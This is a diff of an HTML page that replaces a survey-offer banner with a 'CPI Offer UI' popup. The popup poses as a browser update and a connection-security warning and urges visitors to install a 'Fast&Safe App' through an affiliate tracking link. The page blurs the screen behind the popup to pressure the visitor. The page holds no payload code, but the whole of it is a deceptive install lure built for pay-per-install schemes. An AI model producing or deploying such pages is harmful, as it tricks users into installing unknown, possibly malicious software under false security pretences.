@@ -1,53 +1,68 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Survey Offer</title>
+    <title>CPI Offer UI</title>
     <style>
-        #survey-banner {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background-color: #ff5733;
-            color: white;
-            padding: 15px 20px;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            display: none;
-            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
-            animation: fadeIn 1s ease-in-out;
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: url('blurred_background.jpg') no-repeat center center/cover;
+            position: relative;
         }
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
+        
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            backdrop-filter: blur(10px);
+        }
+        
+        .popup {
+            position: absolute;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+        
+        .popup h2 {
+            margin: 0;
+            font-size: 20px;
+        }
+        
+        .popup p {
+            font-size: 14px;
+            color: #333;
+        }
+        
+        .popup a {
+            display: block;
+            margin-top: 10px;
+            padding: 10px;
+            background: blue;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
-
-    <!-- Survey Offer Banner -->
-    <div id="survey-banner" onclick="redirectToSurvey()">
-        🎯 Take a Fun Survey & Discover Something New! 🚀
+    <div class="overlay"></div>
+    <div class="popup">
+        <h2>Browser update!</h2>
+        <p>Is your connection secure? <br>
+        Install Fast&Safe App to watch any videos in Safe mode</p>
+        <a href="https://uthephifie.net/link?z=9157142&var={SOURCE_ID}&ymid={CLICK_ID">Install</a>
     </div>
-
-    <script>
-        // Zeydoo Tracking Link (Replace with your actual tracking link)
-        const zeydooSurveyLink = "https://kexithakreemtou.com/link?z=9156860&var={SOURCE_ID}&ymid={CLICK_ID}"; 
-
-        function redirectToSurvey() {
-            window.open(zeydooSurveyLink, "_blank");
-        }
-
-        // Show the banner after 10 seconds (Encourages engagement)
-        setTimeout(() => {
-            document.getElementById("survey-banner").style.display = "block";
-        }, 0);
-    </script>
-
 </body>
 </html>
-
